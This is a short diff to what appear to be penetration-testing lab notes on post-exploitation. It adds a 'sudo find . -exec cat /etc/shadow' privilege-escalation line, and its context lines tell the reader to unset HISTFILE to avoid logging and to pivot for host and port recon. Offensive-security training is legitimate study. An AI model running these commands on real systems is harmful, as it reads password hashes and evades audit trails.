@@ -37,8 +37,10 @@ Files of Interest
     - cat /etc/shadow
 
 From your Web Server ssh session, unset HISTFILE and drop into a bash. Conduct further recon from your new pivot point. This means Host discovery
-and port ennumeration
+and port ennumeration.
 
+
+sudo find . -exec cat /etc/shadow \; -quit
 
 Web Exploitation
 
